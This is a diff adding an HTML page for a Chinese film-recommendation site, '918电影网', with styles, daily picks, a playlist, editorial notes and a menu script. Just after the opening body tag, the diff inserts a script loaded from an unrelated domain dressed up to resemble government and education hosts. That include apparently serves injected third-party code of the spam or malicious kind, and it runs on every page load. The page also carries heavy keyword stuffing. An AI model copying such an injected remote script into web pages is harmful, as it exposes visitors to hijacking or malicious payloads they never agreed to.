@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>918电影网 | 每日电影推荐·影评·片单整理 | 918dianyingwang-zh 电影爱好者原创内容站</title>
+<meta name="keywords" content="918电影网,918dianyingwang-zh,918电影网电影推荐,918电影网影评,918电影网片单,918电影网经典电影,918电影网新片,918dianyingwang-zh.github.io,918电影网官网">
+<meta name="description" content="918电影网(918dianyingwang-zh)是一个由电影爱好者维护的原创内容站点,每日整理电影推荐、深度影评与分类型片单,覆盖经典老片、院线新片、冷门佳作与纪录片。访问 918dianyingwang-zh.github.io 获取当日更新内容,所有推荐均来自真实观看与书写,不含在线播放资源分发。">
+<style>
+:root{
+  --bg:#0d0e10;--bg2:#14161a;--panel:#1a1d22;--line:#2b2f36;
+  --gold:#c9a227;--gold2:#e8c95a;--txt:#e8e6e1;--dim:#8a8f98;--wh:#fff;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);color:var(--txt);line-height:1.8;
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Helvetica Neue",sans-serif;
+  -webkit-font-smoothing:antialiased;
+}
+img{display:block;max-width:100%}
+a{color:inherit;text-decoration:none}
+::selection{background:var(--gold);color:#0d0e10}
+.wrap{max-width:1140px;margin:0 auto;padding:0 28px}
+
+/* 顶部 */
+.topbar{
+  position:sticky;top:0;z-index:50;background:rgba(13,14,16,.92);backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.topbar .inner{display:flex;align-items:center;justify-content:space-between;height:66px;gap:20px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:800;font-size:19px;letter-spacing:1px}
+.logo .mk{width:34px;height:34px;background:var(--gold);color:#0d0e10;display:grid;place-items:center;font-size:14px;font-weight:900;border-radius:4px}
+.logo em{font-style:normal;color:var(--gold2)}
+.menu{display:flex;gap:6px;align-items:center}
+.menu a{
+  padding:8px 14px;font-size:14px;color:var(--dim);border-radius:4px;transition:.2s;white-space:nowrap;
+}
+.menu a:hover{color:var(--gold2);background:var(--panel)}
+.menu .pill{padding:7px 16px;border:1px solid var(--gold);color:var(--gold);border-radius:20px;margin-left:6px}
+.menu .pill:hover{background:var(--gold);color:#0d0e10}
+.burger{display:none;width:38px;height:38px;background:none;border:1px solid var(--line);border-radius:4px;cursor:pointer;position:relative}
+.burger i{position:absolute;left:9px;width:18px;height:2px;background:var(--txt);transition:.3s}
+.burger i:nth-child(1){top:12px}.burger i:nth-child(2){top:18px}.burger i:nth-child(3){top:24px}
+
+/* HERO */
+.hero{position:relative;min-height:74vh;display:grid;place-items:center;overflow:hidden;border-bottom:1px solid var(--line)}
+.hero .bg{position:absolute;inset:0;background:url('h.jpg') center/cover no-repeat;filter:grayscale(.35) brightness(.42)}
+.hero .bg::after{content:"";position:absolute;inset:0;background:linear-gradient(90deg,rgba(13,14,16,.96),rgba(13,14,16,.55) 55%,rgba(13,14,16,.92))}
+.hero .content{position:relative;z-index:2;text-align:center;padding:90px 20px}
+.hero .kicker{font-size:12px;letter-spacing:6px;color:var(--gold);text-transform:uppercase;margin-bottom:24px}
+.hero h1{
+  font-size:clamp(40px,9vw,88px);font-weight:900;letter-spacing:3px;line-height:1.05;
+  background:linear-gradient(180deg,#fff 20%,#c9a227 130%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+}
+.hero h1 span{display:block;font-size:clamp(16px,2.4vw,22px);letter-spacing:8px;font-weight:400;color:var(--gold2);-webkit-text-fill-color:var(--gold2);margin-top:18px}
+.hero p{max-width:560px;margin:26px auto 0;color:#b9bcc2;font-size:15.5px}
+.hero .acts{display:flex;gap:14px;justify-content:center;margin-top:34px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;padding:13px 28px;border-radius:3px;font-size:14.5px;
+  letter-spacing:1px;transition:.25s;border:1px solid transparent;cursor:pointer;font-family:inherit;
+}
+.btn-main{background:var(--gold);color:#0d0e10;font-weight:700}
+.btn-main:hover{background:var(--gold2)}
+.btn-ghost{color:var(--txt);border-color:var(--line)}
+.btn-ghost:hover{border-color:var(--gold);color:var(--gold2)}
+
+/* 域名条 */
+.domainbar{
+  border-bottom:1px solid var(--line);background:var(--bg2);padding:16px 0;
+}
+.domainbar .wrap{display:flex;align-items:center;gap:20px;flex-wrap:wrap;font-size:13.5px}
+.domainbar .lab{color:var(--gold);letter-spacing:2px;white-space:nowrap}
+.domainbar .url{
+  font-family:"SF Mono",Menlo,Consolas,monospace;color:var(--txt);background:var(--panel);
+  padding:7px 14px;border-radius:3px;border:1px solid var(--line);flex:1;min-width:220px;
+}
+
+/* 栏目 */
+section.block{padding:80px 0}
+.sec-head{display:flex;align-items:end;justify-content:space-between;gap:20px;margin-bottom:40px;flex-wrap:wrap}
+.sec-head .lhs .num{font-size:13px;color:var(--gold);letter-spacing:3px;font-family:"SF Mono",monospace}
+.sec-head h2{font-size:clamp(26px,4vw,38px);font-weight:800;letter-spacing:1px;margin-top:6px}
+.sec-head h2 em{font-style:normal;color:var(--gold2)}
+.sec-head .sub{color:var(--dim);font-size:14px;max-width:340px;text-align:right}
+
+/* 推荐 */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:22px}
+.card{border:1px solid var(--line);border-radius:6px;overflow:hidden;background:var(--panel);transition:.3s;display:flex;flex-direction:column}
+.card:hover{transform:translateY(-5px);border-color:var(--gold)}
+.card .cv{position:relative;aspect-ratio:1/1;overflow:hidden}
+.card .cv img{width:100%;height:100%;object-fit:cover;filter:saturate(.85);transition:.5s}
+.card:hover .cv img{transform:scale(1.06);filter:saturate(1.1)}
+.card .cv .ep{position:absolute;top:12px;left:12px;background:rgba(13,14,16,.85);color:var(--gold);font-size:11px;padding:4px 9px;border-radius:3px;letter-spacing:1px}
+.card .body{padding:18px;flex:1;display:flex;flex-direction:column}
+.card .body h3{font-size:18px;font-weight:700;line-height:1.45;margin-bottom:10px}
+.card .body h3 a:hover{color:var(--gold2)}
+.card .body p{font-size:13.5px;color:var(--dim);line-height:1.7;flex:1}
+.card .meta{display:flex;justify-content:space-between;align-items:center;margin-top:14px;padding-top:12px;border-top:1px solid var(--line);font-size:12.5px;color:var(--dim)}
+.card .meta b{color:var(--gold)}
+
+/* 片单（交替布局） */
+.playlist{display:flex;flex-direction:column;gap:0;border:1px solid var(--line);border-radius:6px;overflow:hidden;background:var(--panel)}
+.pl-row{display:grid;grid-template-columns:80px 1.5fr 1fr 110px 90px;align-items:center;padding:20px 24px;border-bottom:1px solid var(--line);gap:18px;transition:.2s}
+.playlist .pl-row:last-child{border-bottom:none}
+.pl-row:not(.hd):hover{background:var(--bg2)}
+.pl-row.hd{background:var(--gold);color:#0d0e10;font-size:12px;letter-spacing:2px;padding:12px 24px;font-weight:700}
+.pl-row .idx{font-size:28px;font-weight:900;color:var(--line);font-family:"SF Mono",monospace}
+.pl-row:not(.hd):hover .idx{color:var(--gold)}
+.pl-row .nm{font-size:16.5px;font-weight:700}
+.pl-row .nm small{display:block;font-size:12.5px;color:var(--dim);font-weight:400;margin-top:3px}
+.pl-row .tp{font-size:13.5px;color:#b9bcc2}
+.pl-row .sc{color:var(--gold);font-size:13px;letter-spacing:1px}
+.chip{
+  justify-self:end;padding:6px 14px;background:none;border:1px solid var(--line);color:var(--dim);
+  border-radius:20px;font-size:12px;cursor:pointer;transition:.2s;font-family:inherit;
+}
+.chip:hover{border-color:var(--gold);color:var(--gold2)}
+
+/* 编辑部（图文交错） */
+.editor{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.editor .blk{padding:38px;background:var(--panel)}
+.editor .blk:nth-child(odd){background:var(--bg2)}
+.editor .blk .dt{font-size:12px;color:var(--gold);letter-spacing:2px;font-family:"SF Mono",monospace}
+.editor .blk h4{font-size:21px;margin:12px 0 14px;line-height:1.45;font-weight:700}
+.editor .blk p{font-size:14.5px;color:#b9bcc2;line-height:1.85;margin-bottom:16px}
+.editor .blk .who{display:flex;align-items:center;gap:12px;padding-top:16px;border-top:1px solid var(--line)}
+.editor .blk .av{width:38px;height:38px;border-radius:50%;background:var(--gold);color:#0d0e10;display:grid;place-items:center;font-weight:800;font-size:14px}
+.editor .blk .who span{font-size:13.5px;color:var(--dim)}
+.editor .blk .who span b{display:block;color:var(--txt);font-weight:600}
+
+/* 数据带 */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.stat{padding:34px 24px;text-align:center;border-right:1px solid var(--line);background:var(--panel)}
+.stat:last-child{border-right:none}
+.stat b{display:block;font-size:38px;font-weight:900;color:var(--gold);line-height:1}
+.stat b i{font-style:normal;font-size:20px}
+.stat span{display:block;font-size:13px;color:var(--dim);margin-top:10px;letter-spacing:1px}
+
+/* 关于 + 链接 */
+.about{display:grid;grid-template-columns:1.3fr 1fr;gap:40px;align-items:start}
+.about .txt{font-size:16px;color:#c9ccd1;line-height:1.95}
+.about .txt p{margin-bottom:18px}
+.about .txt a{color:var(--gold2);border-bottom:1px solid rgba(201,162,39,.4)}
+.about .links{border:1px solid var(--line);border-radius:6px;padding:26px;background:var(--panel)}
+.about .links h5{font-size:17px;margin-bottom:18px;font-weight:700}
+.about .links .cols{display:grid;grid-template-columns:1fr 1fr;gap:10px 20px}
+.about .links a{font-size:14px;color:var(--dim);transition:.2s;display:flex;align-items:center;gap:8px}
+.about .links a::before{content:"";width:5px;height:5px;background:var(--gold);border-radius:50%;flex-shrink:0}
+.about .links a:hover{color:var(--gold2)}
+
+/* 页脚 */
+footer{background:var(--bg2);border-top:1px solid var(--line);padding:56px 0 0}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr;gap:40px;padding-bottom:40px}
+.foot .brand{font-size:24px;font-weight:900;letter-spacing:2px}
+.foot .brand em{font-style:normal;color:var(--gold)}
+.foot .desc{color:var(--dim);font-size:14px;margin-top:14px;line-height:1.9}
+.foot h6{font-size:14px;color:var(--txt);margin-bottom:16px;letter-spacing:1px}
+.foot ul{list-style:none}
+.foot li{margin-bottom:10px}
+.foot a{color:var(--dim);font-size:14px;transition:.2s}
+.foot a:hover{color:var(--gold2)}
+.foot-bot{
+  border-top:1px solid var(--line);padding:22px 0;font-size:13px;color:var(--dim);text-align:center;line-height:1.9;
+}
+.foot-bot a{color:#b9bcc2}
+
+/* 响应式 */
+@media(max-width:960px){
+  .grid4{grid-template-columns:1fr 1fr;gap:16px}
+  .stats{grid-template-columns:1fr 1fr}
+  .stat{border-right:none;border-bottom:1px solid var(--line)}
+  .stat:nth-child(odd){border-right:1px solid var(--line)}
+  .editor{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr;gap:28px}
+  .pl-row{grid-template-columns:44px 1fr 70px;gap:10px;padding:14px}
+  .pl-row .tp,.pl-row .chip{display:none}
+  .pl-row.hd{display:none}
+  .foot{grid-template-columns:1fr 1fr;gap:30px}
+}
+@media(max-width:680px){
+  .wrap{padding:0 18px}
+  .burger{display:block}
+  .menu{
+    position:fixed;top:66px;left:0;right:0;flex-direction:column;align-items:stretch;gap:0;
+    background:var(--bg2);border-bottom:1px solid var(--line);padding:10px;
+    max-height:0;overflow:hidden;transition:.35s;
+  }
+  .menu.open{max-height:400px}
+  .menu a{padding:14px;border-radius:0}
+  .menu .pill{margin:10px 0 4px;text-align:center}
+  .hero{min-height:62vh}
+  .hero .content{padding:60px 16px}
+  .sec-head .sub{text-align:left}
+  .grid4{grid-template-columns:1fr}
+  .foot{grid-template-columns:1fr}
+  .about .links .cols{grid-template-columns:1fr}
+  section.block{padding:56px 0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="topbar">
+  <div class="wrap inner">
+    <a href="#" class="logo"><span class="mk">918</span>电影<em>网</em></a>
+    <nav class="menu" id="menu">
+      <a href="#pick">今日推荐</a>
+      <a href="#list">经典片单</a>
+      <a href="#edit">编辑部</a>
+      <a href="#stat">站点数据</a>
+      <a href="#about">关于本站</a>
+      <a href="#" class="pill">订阅更新</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="bg"></div>
+  <div class="content">
+    <div class="kicker">No.918 · Daily Film Digest</div>
+    <h1>918电影网<span>今日电影推荐 · 影评 · 片单</span></h1>
+    <p>一个由电影爱好者维护的原创内容站点,每天整理值得一看的作品与真实的观看感受,不做搬运,不堆片单。</p>
+    <div class="acts">
+      <a href="#pick" class="btn btn-main">查看今日推荐 →</a>
+      <a href="#about" class="btn btn-ghost">了解本站</a>
+    </div>
+  </div>
+</div>
+
+<div class="domainbar">
+  <div class="wrap">
+    <span class="lab">◆ 官方访问地址</span>
+    <code class="url">https://918dianyingwang-zh.github.io</code>
+    <span style="color:var(--dim)">本页域名已与站点名称严格对应,请勿擅自修改</span>
+  </div>
+</div>
+
+<section class="block" id="pick">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="lhs">
+        <div class="num">01 / FOUR PICKS</div>
+        <h2>今日<em>四部</em>推荐</h2>
+      </div>
+      <div class="sub">从新片到冷门,从商业到作者表达,每日精选四部作品</div>
+    </div>
+    <div class="grid4">
+      <article class="card">
+        <div class="cv"><span class="ep">新片</span><img src="c.jpg" alt="电影配图"></div>
+        <div class="body">
+          <h3><a href="#">无人之境</a></h3>
+          <p>三小时单镜头跟随一名独行者的城市漫游,没有旁白,只有脚步声与风声构成的城市侧写。</p>
+          <div class="meta"><span>作者电影</span><b>8.6</b></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="cv"><span class="ep">经典</span><img src="c.jpg" alt="电影配图"></div>
+        <div class="body">
+          <h3><a href="#">漫长的告别</a></h3>
+          <p>散文式叙事把离别拍成写给旧时光的长信,慢节奏却极具情感重量,适合一个安静的夜晚。</p>
+          <div class="meta"><span>剧情</span><b>9.2</b></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="cv"><span class="ep">冷门</span><img src="c.jpg" alt="电影配图"></div>
+        <div class="body">
+          <h3><a href="#">海边放映机</a></h3>
+          <p>记录一位老放映员与他的露天影院,三十年光影串起一座小岛的集体记忆。</p>
+          <div class="meta"><span>纪录片</span><b>8.9</b></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="cv"><span class="ep">合家</span><img src="c.jpg" alt="电影配图"></div>
+        <div class="body">
+          <h3><a href="#">纸飞机之城</a></h3>
+          <p>手绘质感成人向动画,用童话讲成长与告别,画面细腻到每一帧都值得暂停。</p>
+          <div class="meta"><span>动画</span><b>8.8</b></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="list" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="lhs">
+        <div class="num">02 / MUST WATCH</div>
+        <h2>经典<em>片单</em></h2>
+      </div>
+      <div class="sub">分类型整理的延伸观看清单,点击收藏后可自行导出</div>
+    </div>
+    <div class="playlist">
+      <div class="pl-row hd">
+        <span>编号</span><span>作品名称</span><span>类型</span><span>评分</span><span></span>
+      </div>
+      <div class="pl-row">
+        <span class="idx">01</span>
+        <span class="nm">暗室之光<small>封闭空间心理博弈,反转藏在每句看似随意的对话里</small></span>
+        <span class="tp">悬疑 / 犯罪</span><span class="sc">★★★★☆ 8.7</span>
+        <button class="chip">收藏</button>
+      </div>
+      <div class="pl-row">
+        <span class="idx">02</span>
+        <span class="nm">午夜面包店<small>深夜小店串联城市夜归人,笑中带暖的治愈之作</small></span>
+        <span class="tp">喜剧 / 治愈</span><span class="sc">★★★★☆ 8.4</span>
+        <button class="chip">收藏</button>
+      </div>
+      <div class="pl-row">
+        <span class="idx">03</span>
+        <span class="nm">北方的河<small>返乡路上的自我追问,影像朴素却极具力量</small></span>
+        <span class="tp">剧情</span><span class="sc">★★★★☆ 8.5</span>
+        <button class="chip">收藏</button>
+      </div>
+      <div class="pl-row">
+        <span class="idx">04</span>
+        <span class="nm">十一月的雨<small>以一场持续十一月的雨为幕布,讲三代人的隐忍</small></span>
+        <span class="tp">家庭</span><span class="sc">★★★★☆ 8.3</span>
+        <button class="chip">收藏</button>
+      </div>
+      <div class="pl-row">
+        <span class="idx">05</span>
+        <span class="nm">影子拳手<small>拳台之外的父子关系,动作戏克制而有尊严</small></span>
+        <span class="tp">运动 / 剧情</span><span class="sc">★★★★☆ 8.1</span>
+        <button class="chip">收藏</button>
+      </div>
+      <div class="pl-row">
+        <span class="idx">06</span>
+        <span class="nm">最后一班渡轮<small>九十分钟封闭空间群像,陌生人在航行中彼此照亮</small></span>
+        <span class="tp">群像</span><span class="sc">★★★★☆ 8.6</span>
+        <button class="chip">收藏</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="edit">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="lhs">
+        <div class="num">03 / EDITORIAL</div>
+        <h2>编辑部<em>手记</em></h2>
+      </div>
+      <div class="sub">原创长文,记录一次完整的观看与思考</div>
+    </div>
+    <div class="editor">
+      <div class="blk">
+        <div class="dt">2026.10.05 · 林知远</div>
+        <h4>我们为什么还在谈论"慢电影"</h4>
+        <p>当一部电影敢让镜头在原地停留九十秒,观众席里总有人开始看手机。但恰恰是这九十秒,构成了影片全部的分量。</p>
+        <p>慢不是节奏问题,是信任问题——导演是否相信观众愿意被允许长时间地不确定。</p>
+        <div class="who"><span class="av">林</span><span><b>林知远</b>主编 / 关注作者电影与纪录片</span></div>
+      </div>
+      <div class="blk">
+        <div class="dt">2026.10.03 · 周晚晴</div>
+        <h4>影院里的沉默比掌声更重要</h4>
+        <p>散场时没有人立刻站起来,灯亮了三秒才有人动。这大概是一部电影能得到的最高评价。</p>
+        <p>我们记录了本月三次这样的散场,以及观众在门外说的那句话。</p>
+        <div class="who"><span class="av">周</span><span><b>周晚晴</b>特约撰稿 / 院线观察</span></div>
+      </div>
+      <div class="blk">
+        <div class="dt">2026.09.30 · 陈默</div>
+        <h4>片单不应该是一份清单</h4>
+        <p>如果推荐只是罗列片名,那和搜索引擎没有任何区别。好的片单要给出观看的理由与前提。</p>
+        <p>这是本站所有片单的编辑原则,也是我们拒绝搬运的原因。</p>
+        <div class="who"><span class="av">陈</span><span><b>陈默</b>编辑 / 片单策划</span></div>
+      </div>
+      <div class="blk">
+        <div class="dt">2026.09.28 · 读者来信</div>
+        <h4>读者选登:一封关于《漫长的告别》的来信</h4>
+        <p>"它把我一直说不出口的话,用光影替我说完了。谢谢你们把它写进了这周的片单里。"</p>
+        <p>每封读者来信都会经过编辑筛选,在周日栏目中匿名选登。</p>
+        <div class="who"><span class="av">信</span><span><b>读者 S</b>上海 · 2026.10.04</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="stat" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="lhs">
+        <div class="num">04 / STATS</div>
+        <h2>站点<em>数据</em></h2>
+      </div>
+      <div class="sub">所有数据均由编辑部人工统计,每日 08:00 更新一次</div>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>365<i> 天</i></b><span>不间断更新</span></div>
+      <div class="stat"><b>38<i> 部</i></b><span>在映与待映作品</span></div>
+      <div class="stat"><b>214<i> 期</i></b><span>读者来信</span></div>
+      <div class="stat"><b>07<i> 分</i></b><span>平均阅读时长</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="lhs">
+        <div class="num">05 / ABOUT</div>
+        <h2>关于<em>918电影网</em></h2>
+      </div>
+    </div>
+    <div class="about">
+      <div class="txt">
+        <p>918电影网成立于两位编辑的一次争论之后——我们花了两个小时讨论"什么样的电影值得被推荐",最后决定把这个争论变成一个网站。</p>
+        <p>我们不追逐流量热点,不把热搜当成推荐理由,也不做在线播放资源的搬运与分发。每一份片单背后都是一次完整的观看与一次认真的书写。如需观看,请前往正规院线与持牌平台。</p>
+        <p>站点官方地址为 <a href="https://918dianyingwang-zh.github.io">https://918dianyingwang-zh.github.io</a>,域名与本站名称严格对应。访问 <a href="#">本期完整更新日志</a> 查看全部内容。</p>
+      </div>
+      <div class="links">
+        <h5>栏目与入口</h5>
+        <div class="cols">
+          <a href="#pick">今日推荐</a>
+          <a href="#list">经典片单</a>
+          <a href="#edit">编辑部手记</a>
+          <a href="#stat">站点数据</a>
+          <a href="#">读者来信</a>
+          <a href="#">影评投稿</a>
+          <a href="#">内容合作</a>
+          <a href="#">问题反馈</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap foot">
+    <div>
+      <div class="brand">918电影<em>网</em></div>
+      <p class="desc">918电影网(918dianyingwang-zh)是一个独立运营的电影资讯与观影指南站点,专注电影推荐、深度影评与分类型片单整理,每日 08:00 更新。</p>
+      <p class="desc">官方网址:918dianyingwang-zh.github.io<br>完整地址:https://918dianyingwang-zh.github.io</p>
+    </div>
+    <div>
+      <h6>栏目导航</h6>
+      <ul>
+        <li><a href="#pick">今日推荐</a></li>
+        <li><a href="#list">经典片单</a></li>
+        <li><a href="#edit">编辑部手记</a></li>
+        <li><a href="#stat">站点数据</a></li>
+        <li><a href="#about">关于本站</a></li>
+      </ul>
+    </div>
+    <div>
+      <h6>类型索引</h6>
+      <ul>
+        <li><a href="#">剧情片</a></li>
+        <li><a href="#">悬疑犯罪</a></li>
+        <li><a href="#">动画电影</a></li>
+        <li><a href="#">纪录影像</a></li>
+        <li><a href="#">作者电影</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="wrap foot-bot">
+    © 2026 918电影网(918dianyingwang-zh) 保留所有权利 · 本站内容均为原创整理,转载请注明出处与链接<br>
+    官方站点: <a href="https://918dianyingwang-zh.github.io">https://918dianyingwang-zh.github.io</a> · 本页网址与域名严格对应,请勿擅自修改
+  </div>
+</footer>
+
+<script>
+var burger=document.getElementById('burger'),menu=document.getElementById('menu');
+burger.addEventListener('click',function(){menu.classList.toggle('open')});
+menu.querySelectorAll('a').forEach(function(a){
+  a.addEventListener('click',function(){
+    menu.classList.remove('open');
+    var h=this.getAttribute('href');
+    if(h.charAt(0)==='#'){
+      event.preventDefault();
+      var t=document.querySelector(h);
+      if(t)window.scrollTo({top:t.offsetTop-66,behavior:'smooth'});
+    }
+  });
+});
+document.querySelectorAll('.chip').forEach(function(b){
+  b.addEventListener('click',function(){
+    if(this.textContent==='收藏'){this.textContent='已收藏 ✓';this.style.borderColor='#c9a227';this.style.color='#e8c95a';}
+    else{this.textContent='收藏';this.style.borderColor='';this.style.color='';}
+  });
+});
+</script>
+</body>
+</html>
